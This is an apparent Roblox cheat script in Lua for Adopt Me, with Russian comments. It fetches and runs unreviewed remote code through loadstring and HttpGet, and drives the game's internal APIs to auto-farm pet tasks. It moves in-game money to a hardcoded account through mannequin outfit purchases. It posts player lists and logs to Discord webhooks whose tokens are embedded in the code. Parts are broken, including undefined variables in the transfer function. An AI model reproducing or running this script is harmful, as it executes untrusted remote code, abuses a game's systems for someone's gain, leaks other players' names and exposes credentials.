--Кастомные переменные
_GTransferMoneyPlayer = "LanshRBLX"

local function decryptAdoptMeAPIs()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/lanshrblx/s78btadd81d7/refs/heads/main/APIdb"))()
  local function decryptAPIS(data)
  local mappedDictionary = {}
  local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys"))
  local RouterClient = Fsys.load("RouterClient")
  
  for _, v in pairs(data) do
    local key = v
    local endpoint = RouterClient.get(v)
    mappedDictionary[key] = endpoint
  end

  return mappedDictionary
  end
  local APIS = decryptAPIS(globalDecryptedAPIS)

  for k,v in pairs(APIS) do
    APIS[k].Name = k
  end
end
decryptAdoptMeAPIs()

--Спавню парт на карте
local Part = Instance.new("Part")
Part.Parent = game.Workspace
Part.Transparency = 0.5
Part.Anchored = true
Part.Size = Vector3.new(2000, 10, 2000)
Part.Position = Vector3.new(0,60,-2000)

--отключение энпоинтов
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("PayAPI/DisablePopups"):FireServer()

--Базовая настройка игрока
--Цфрейм от персонажа
function getRoot()
	local char = game:GetService("Players").LocalPlayer.Character
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end
local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys"))
local ClientData = Fsys.load("ClientData")
local CharWrapperClient = Fsys.load("CharWrapperClient")
_GlocalPlayer = game:GetService("Players").LocalPlayer
_GPlayerCharacterWrap = CharWrapperClient.get(_GlocalPlayer.Character)
_Ginventory = ClientData.get_server(_GlocalPlayer, "inventory") --food, roleplay, toys, pet_accessories, transport, gifts, pets, strollers, stickers
local args = {
	"Babies",
	{
		dont_respawn = true,
		source_for_logging = "avatar_editor"
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))

--Заполняю таблицу фурнитуры
_GdataTable = {}
local args = {
	game:GetService("Players"):WaitForChild(_GTransferMoneyPlayer)
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/SubscribeToHouse"):FireServer(unpack(args))
local args = {
	"housing",
	game:GetService("Players"):WaitForChild(_GTransferMoneyPlayer)
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
getRoot().CFrame = CFrame.new(0, 72, -2000)
task.wait(15)
for i, v in pairs(workspace.HouseInteriors.furniture:GetChildren()) do
	if v:FindFirstChild("Mannequin") then
		_GdataTable["transferMoney"]=v:FindFirstChild("Mannequin"):GetAttribute("furniture_unique")
		_GdataTable["outfitId"]=v:FindFirstChild("Mannequin"):FindFirstChild("Mannequin"):GetAttribute("outfit_version")
	end
end
local args = {
	game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/UnsubscribeFromHouse"):InvokeServer(unpack(args))
local args = {
	game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/SubscribeToHouse"):FireServer(unpack(args))
local args = {
	"housing",
	game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
getRoot().CFrame = CFrame.new(0, 72, -2000)
local args = {
	"housing",
	game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
}
task.wait(15)
for i, v in pairs(workspace.HouseInteriors.furniture:GetChildren()) do
	if v:FindFirstChild("Piano") then
		_GdataTable["bored"]=v:FindFirstChild("Piano"):GetAttribute("furniture_unique")
		print("Bored found")
	elseif v:FindFirstChild("BasicCrib") then
		_GdataTable["sleep"]=v:FindFirstChild("BasicCrib"):GetAttribute("furniture_unique")
		print("Sleep found")
	elseif v:FindFirstChild("PetWaterBowl") then
		_GdataTable["drink"]=v:FindFirstChild("PetWaterBowl"):GetAttribute("furniture_unique")
		print("Drink found")
	elseif v:FindFirstChild("PetFoodBowl") then
		_GdataTable["eat"]=v:FindFirstChild("PetFoodBowl"):GetAttribute("furniture_unique")
		print("Eat found")
	elseif v:FindFirstChild("ModernShower") then
		_GdataTable["dirty"]=v:FindFirstChild("ModernShower"):GetAttribute("furniture_unique")
		print("Dirty found")
	elseif v:FindFirstChild("Lures2023NormalLure") then
		_GdataTable["lure"]=v:FindFirstChild("Lures2023NormalLure"):GetAttribute("furniture_unique")
		print("Lure found")
	elseif v:FindFirstChild("Toilet") then
		_GdataTable["toilet"]=v:FindFirstChild("Toilet"):GetAttribute("furniture_unique")
		print("Toilet found")
	end
end
for i,v in pairs(_Ginventory.toys) do
    if v.id == "squeaky_bone_default" then
        _GdataTable["petCatch"] = v.unique_id
		print("Bone found")
    end
end
for i,v in pairs(_Ginventory.strollers) do
    if v.id == "stroller-default" then
        _GdataTable["petRide"] = v.unique
		print("Stroller found")
    end
end

--Получаю питомца с максимальным уровнем дружбы
local largestFriendshipLevel = -1
local largestUnique = 0
for key ,Item in pairs(_Ginventory.pets) do
  local unqiueId = 0
  for key1, v1 in pairs(Item) do
    if type(v1)=="table" then
      for key2, v2 in pairs(v1) do
        if key2 == "friendship_level" and v2>largestFriendshipLevel and Item.id ~= "practice_dog" then
          largestFriendshipLevel = v2
          largestUnique = unqiueId
        end
      end
    else
      if key1 == "unique" then
        unqiueId = v1
      end
    end
  end
end
local args = {largestUnique,{use_sound_delay = true,equip_as_last = false}}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
local function findCurrentEntity(PlayerName)
    local Fsys = require(game.ReplicatedStorage.Fsys)
    local PetEntityManager = Fsys.load("PetEntityManager")
    local CharWrapperClient = Fsys.load("CharWrapperClient")
    local currentEntity = 0
    currentEntity = PetEntityManager.get_local_owned_pet_entities(PlayerName)[1]
    return currentEntity
end
local petEntity = findCurrentEntity(_GlocalPlayer)

--Общие таски
--done tested
local function sleep(object, furnitureId)
	if object.is_pet_entity then
		local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		furnitureId,
		"UseBlock",
		{
			cframe = getRoot().CFrame
		},
		workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"UseBlock",
			{
				cframe = getRoot().CFrame
			},
			object.char
		}
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	end
	task.wait(20)
end
--done tested
local function dirty(object, furnitureId)
	if object.is_pet_entity then
		local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		furnitureId,
		"UseBlock",
		{
			cframe = getRoot().CFrame
		},
		workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"UseBlock",
			{
				cframe = getRoot().CFrame
			},
			object.char
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	end
	task.wait(20)
end
--done tested
local function toilet(object, furnitureId)
    local cframeForArgs = getRoot().CFrame
	if object.is_pet_entity then
		local args = {
		    game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		    furnitureId,
		    "Seat1",
		    {
		    	cframe = cframeForArgs
		    },
		    workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"Seat1",
			{
				cframe = cframeForArgs
			},
			object.char
		}
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	end
	task.wait(20)
end
--done tested
local function bored(object, furnitureId)
	if object.is_pet_entity then
		local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		furnitureId,
		"Seat1",
		{
			cframe = getRoot().CFrame
		},
		workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"Seat1",
			{
				cframe = getRoot().CFrame
			},
			object.char
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	end
	task.wait(20)
end
--NOT done baby
local function eat(object, furnitureId)
	if object.is_pet_entity then
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"UseBlock",
			{
				cframe = getRoot().CFrame
			},
			workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		local args = {
			"food",
			"teachers_apple",
			{
				buy_count = 1
			}
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
		local uniqueId = 0
		for i,v in pairs(_Ginventory.food) do
    		if v.id == "teachers_apple" then
				uniqueId = v.unique
    		end
		end
		local args = {
			uniqueId,
			"END"
		}
		for i=1, 3 do
			game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/ServerUseTool"):FireServer(unpack(args))
			task.wait(2)
		end
	end
	task.wait(20)
end
--NOT done baby
local function drink(object, furnitureId)
	if object.is_pet_entity then
		local args = {
			game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
			furnitureId,
			"UseBlock",
			{
				cframe = getRoot().CFrame
			},
			workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
	else
		--Baby business logic
	end
	task.wait(20)
end

--Локально для питомца
--done tested
local function petCatch(toyUniqueId)
	local args = {
		toyUniqueId,
		{
			use_sound_delay = true,
			equip_as_last = false
		}
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))

	for i=1, 3 do
		local args = {
		toyUniqueId,
		"START"
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/ServerUseTool"):FireServer(unpack(args))

		local args = {
		"__Enum_PetObjectCreatorType_1",
		{
			reaction_name = "ThrowToyReaction",
			unique_id = toyUniqueId
		}
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("PetObjectAPI/CreatePetObject"):InvokeServer(unpack(args))

		local args = {
		toyUniqueId,
		{
		from_throw_toy = true
		}
		}
		game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Unequip"):InvokeServer(unpack(args))
		wait(5)
	end
	local args = {
		toyUniqueId
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Unequip"):InvokeServer(unpack(args))
	task.wait(20)
end
--done tested
local function petWalk(object)
	local args = {
		workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AdoptAPI/HoldBaby"):FireServer(unpack(args))

	local humanoid = _GlocalPlayer.Character:WaitForChild("Humanoid")
	for i=1, 50 do
		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		task.wait(0.75)
	end

	local args = {
		workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AdoptAPI/EjectBaby"):FireServer(unpack(args))
	task.wait(20)
end
--done tested
local function petRide(object, strollerId)
	local args = {
	strollerId,
		{
			use_sound_delay = true,
			equip_as_last = false
		}
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))

	local humanoid = _GlocalPlayer.Character:WaitForChild("Humanoid")
	for i=1, 50 do
		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		task.wait(0.75)
	end

	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AdoptAPI/UnequipStroller"):FireServer()
		local args = {
			strollerId
		}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Unequip"):InvokeServer(unpack(args))
	task.wait(20)
end
--done tested
local function petPetMe(object)
	local coordinates = game:GetService("UserInputService"):GetMouseLocation()
	for i=1, 4 do
	    local success, response = pcall(function()
	        local remote = game:GetService("ReplicatedStorage").API["AdoptAPI/FocusPet"]
	        local arguments = {workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char))}
	        remote:FireServer(unpack(arguments))
	        remote:FireServer(unpack(arguments))
	        local remote1 = game:GetService("ReplicatedStorage").API["PetAPI/ReplicateActivePerformances"]
	        local arguments1 = {
	            [1] = workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char)),
	            [2] = {["FocusPet"] = true}}
	        local remote2 = game:GetService("ReplicatedStorage").API["PetAPI/ReplicateActivePerformances"]
	        local arguments2 = {
	            [1] = workspace:WaitForChild("Pets"):WaitForChild(tostring(object.base.char)),
	            [2] = {["FocusPet"] = true,["Petting"] = true,["Sick"] = true}}
	        remote1:FireServer(unpack(arguments1))
	        remote2:FireServer(unpack(arguments2))
	        remote1:FireServer(unpack(arguments1))
	        remote2:FireServer(unpack(arguments2))
	        local remote = game:GetService("ReplicatedStorage").API["AilmentsAPI/ProgressPetMeAilment"]
	        local arguments = {[1] = object.unique_id}
	        remote:FireServer(unpack(arguments))
	        remote:FireServer(unpack(arguments))
	    end)

	    if success then
	        print("success", response)
	    else
	        print("error", response)
	    end
	    game:GetService("VirtualInputManager"):SendMouseMoveEvent(coordinates.x + (i * 10), coordinates.y + (i * 10), game.Workspace.CurrentCamera)
	    wait(0.1)
	end
	game:GetService("VirtualInputManager"):SendMouseMoveEvent(coordinates.x, coordinates.y, game.Workspace.CurrentCamera)
	task.wait(20)
end

--Задания с посещением
--
local function camping()
end
--
local function beachParty()
end
--done tested
local function school(petObject)
	local args = {
		"School"
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
	getRoot().CFrame = CFrame.new(0, 72, -2000)
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
	task.wait(40)
end
--done tested
local function sick(petObject)
	local furnitureId
	local args = {
		"Hospital"
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
	getRoot().CFrame = CFrame.new(0, 72, -2000)
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
	task.wait(10)
	for _, value in pairs(workspace.HouseInteriors.furniture:GetChildren()) do
		if value:FindFirstChild("Doctor") then
			local doctor = value:FindFirstChild("Doctor")
			furnitureId = doctor:GetAttribute("furniture_unique")
		end
	end
	local args = {
		furnitureId,
		"UseBlock",
		"Yes",
		_GlocalPlayer.Character
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateInteriorFurniture"):InvokeServer(unpack(args))
	task.wait(40)
end
--done tested
local function pizzaParty(petObject)
	local args = {
		"PizzaShop"
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
	getRoot().CFrame = CFrame.new(0, 72, -2000)
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
	task.wait(40)
end
--done tested
local function salon(petObject)
	local args = {
		"Salon"
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
	getRoot().CFrame = CFrame.new(0, 72, -2000)
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
	task.wait(40)
end

--Прочие функции похожие на задания
local function goToOwnerHome(petObject)
	local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/SubscribeToHouse"):FireServer(unpack(args))
	getRoot().CFrame = CFrame.new(0, 72, -2000)
	local args = {
		"housing",
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("LocationAPI/SetLocation"):FireServer(unpack(args))
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
end
--done tested
local function goOutOwnerHome(petObject)
	local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name)
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/UnsubscribeFromHouse"):InvokeServer(unpack(args))
	local args = {petObject.unique_id,{use_sound_delay = true,equip_as_last = false}}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
end
--done tested
local function exitBabyFromSeat()
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AdoptAPI/ExitSeatStates"):FireServer()
end
--
local function transferCash(furnitureId, outfitId)
	if game:GetService("Players"):FindFirstChild(_GTransferMoneyPlayer) then
		for i=1,3 do
			local success, result = pcall(function()
                local args = {"player","Outfit"}
                local argsToMannequin = {game:GetService("Players"):WaitForChild(_GTransferMoneyPlayer),MannequinId,OutfitId,100}
                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AvatarAPI/BuyMannequinOutfit"):InvokeServer(unpack(argsToMannequin))
                task.wait(2)
                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("AvatarAPI/DeleteOutfit"):FireServer(unpack(args))
            end)
            if success then
                task.wait(2)
            else
                break
            end
		end
	end
end
--done tested
local function useLure(furnitureId)
	local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		furnitureId,
		"UseBlock",
		false,
		game:GetService("Players").LocalPlayer.Character
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))

	local uniqueId
	for i,v in pairs(_Ginventory.food) do
		if v.id == "ice_dimension_2025_ice_soup_bait" then
			uniqueId = v.unique
			break
		end
	end
	local args = {
		game:GetService("Players"):WaitForChild(_GlocalPlayer.Name),
		furnitureId,
		"UseBlock",
		{
			bait_unique = uniqueId
		},
		game:GetService("Players").LocalPlayer.Character
	}
	game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("HousingAPI/ActivateFurniture"):InvokeServer(unpack(args))
end

--Вебхуки
local playersUpdateWebhook = "https://webhook.lewisakura.moe/api/webhooks/1442601246405034143/SjrPkJijNgN-Pxgb-ixgYLadQ6sMcYdhGGVsFq0oQ0IvQruhwdYav5qlIrNMtBr7hwNc"
local taskWebhook = "https://webhook.lewisakura.moe/api/webhooks/1443310818094743693/qiBv6v2o8PXP8M7XyslsygnLk-vftYTbW8G0MhfnuXxxgwUkxQIcglWcSqgoC48YNPYz"
local errorWebhook = "https://webhook.lewisakura.moe/api/webhooks/1444002323016978575/_fm17t5wkZqHxQnhc9F8-a1JBCV10MMiPq5vSvg9ING2ntB5s4f5AY4AO0KcLWDjPN8w"

local function escape(str)
    return str:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
end

local function sendRichMessage(webhookUrl, title, description, color, data, method)
    local playerName = escape(_GlocalPlayer.Name)
    local placeId    = tostring(game.PlaceId)
    local isoTime    = DateTime.now():ToIsoDate()
	
	if method==1 then
		local safeData = escape(tostring(data))
    	local jsonForPlayersUpdateWebhook =
    	    '{"embeds":[{' ..
    	    '"title":"' .. escape(title) .. '",' ..
    	    '"description":"' .. escape(description) .. '",' ..
    	    '"color":' .. (color or 3447003) .. ',' ..
    	    '"fields":[{' ..
    	        '"name":"Players","value":"' .. safeData .. '","inline":true}' ..
    	    '],' ..
    	    '"timestamp":"' .. isoTime .. '"' ..
    	    '}]}'
    	local response = http_request({
    	    Url = webhookUrl,
    	    Method = "POST",
    	    Headers = {
    	        ["Content-Type"] = "application/json"
    	    },
    	    Body = jsonForPlayersUpdateWebhook
    	})
	elseif method==2 then
		local jsonForTaskLogs = 
		'{"embeds":[{' ..
        '"title":"' .. escape(title) .. '",' ..
        '"description":"' .. escape(description) .. '",' ..
        '"color":' .. (color or 3447003) .. ',' ..
        '"fields":[{' ..
            '"name":"персик","value":"щавель","inline":true}' ..
        '],' ..
        '"timestamp":"' .. isoTime .. '"' ..
        '}]}'
		local response = http_request({
    	    Url = webhookUrl,
    	    Method = "POST",
    	    Headers = {
    	        ["Content-Type"] = "application/json"
    	    },
    	    Body = jsonForTaskLogs
    	})
	elseif method==3 then
    	local jsonForErrorLogs =
    	    '{"embeds":[{' ..
    	    '"title":"' .. escape(title) .. '",' ..
    	    '"description":"' .. escape(description) .. '",' ..
    	    '"color":' .. (color or 3447003) .. ',' ..
    	    '"fields":[{' ..
    	        '"name":"ВЕРНИТЕ","value":"АКК БЛЯ ВЕРНИТЕ","inline":true}' ..
    	    '],' ..
    	    '"timestamp":"' .. isoTime .. '"' ..
    	    '}]}'
    	local response = http_request({
    	    Url = webhookUrl,
    	    Method = "POST",
    	    Headers = {
    	        ["Content-Type"] = "application/json"
    	    },
    	    Body = jsonForErrorLogs
    	})
	else
		print("unknown method.")
	end

    return response
end

local function getListOfPlayers()
    local data = ""
    local amount = 0
    for i,v in pairs(game:GetService("Players"):GetChildren()) do
        data = data..tostring(i).." "..tostring(v).."\n"
        amount=amount+1
    end
    return data, amount
end

local function findCurrentEntity(PlayerName)
    local Fsys = require(game.ReplicatedStorage.Fsys)
    local PetEntityManager = Fsys.load("PetEntityManager")
    local CharWrapperClient = Fsys.load("CharWrapperClient")
    local currentEntity = 0
    currentEntity = PetEntityManager.get_local_owned_pet_entities(PlayerName)[1]
    return currentEntity
end

--Main
local ailmentsTable = {
		["Baby"] = {},
		["Pet"]={}
	}
while game:IsLoaded() do
	task.wait(10)
	local playersList, amount = getListOfPlayers()
	sendRichMessage(playersUpdateWebhook, "Регулярное обновление игроков", string.format("Колличество игроков: %s", amount), 15548997, playersList, 1)
	local petEntity = findCurrentEntity(_GlocalPlayer)
    for i,v in pairs (petEntity.ailments) do
	if i =="mystery" or i=="camping"or i=="beach_party" then
		print("bad task")
	elseif i=="sick" or i=="hungry" or i=="ride" or i=="salon" or i=="thirsty" or i=="toilet" or i=="play" or i=="pet_me" or i=="school" or i=="walk" or i=="pizza_party" then
		sendRichMessage(taskWebhook, "Пришло задание", i, 15548997, _ ,2)
		table.insert(ailmentsTable.Pet, 1, i)
	elseif i=="sleepy" or i=="dirty" or i=="bored" then
		sendRichMessage(taskWebhook, "Пришло задание", i, 15548997, _ ,2)
		table.insert(ailmentsTable.Baby, 1, i)
        table.insert(ailmentsTable.Pet, 1, i)
    else print("Error unknown task.")
	end
    end
    for i = #ailmentsTable.Pet, 1, -1 do
        local lastElement = ailmentsTable.Pet[i]
        if lastElement=="sleepy" then 
			goToOwnerHome(petEntity)
			sleep(petEntity, _GdataTable.sleep)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			sleep(_GPlayerCharacterWrap, _GdataTable.sleep)
			exitBabyFromSeat()
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			table.remove(ailmentsTable.Baby)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="dirty" then
			goToOwnerHome(petEntity)
			dirty(petEntity, _GdataTable.dirty)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			dirty(_GPlayerCharacterWrap, _GdataTable.dirty)
			exitBabyFromSeat()
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			table.remove(ailmentsTable.Baby)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="sick" then 
			sick(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			task.wait(5)
        elseif lastElement=="hungry" then 
			goToOwnerHome(petEntity)
			eat(petEntity, _GdataTable.eat)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="ride" then
			goToOwnerHome(petEntity)
			petRide(petEntity, _GdataTable.petRide)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="salon" then 
			salon(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			task.wait(5)
        elseif lastElement=="thirsty" then 
			goToOwnerHome(petEntity)
			drink(petEntity, _GdataTable.drink)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="toilet" then 
			goToOwnerHome(petEntity)
			toilet(petEntity, _GdataTable.toilet)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="play" then 
			goToOwnerHome(petEntity)
			petCatch(_GdataTable.petCatch)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="pet_me" then
			goToOwnerHome(petEntity) 
			petPetMe(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="school" then 
			school(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			task.wait(5)
        elseif lastElement=="bored" then 
			goToOwnerHome(petEntity)
			bored(petEntity, _GdataTable.bored)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			bored(_GPlayerCharacterWrap, _GdataTable.bored)
			exitBabyFromSeat()
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Baby)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="walk" then 
			goToOwnerHome(petEntity)
			petWalk(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			goOutOwnerHome(petEntity)
			task.wait(5)
        elseif lastElement=="pizza_party" then 
			pizzaParty(petEntity)
			sendRichMessage(taskWebhook, "Выполнено задание", lastElement, 5763719, _ ,2)
			table.remove(ailmentsTable.Pet)
			task.wait(5)
        end
    end
	for i=1,3 do
		local success, response pcall(transferCash(_GdataTable.transferMoney, _GdataTable.outfitId))
		if not success then
			sendRichMessage(errorWebhook, "ОШИБКА", "Аккаунт принимающий деньги вылетел",15548997,_,3)
			break
		end
	end
	useLure(_GdataTable.lure)
end
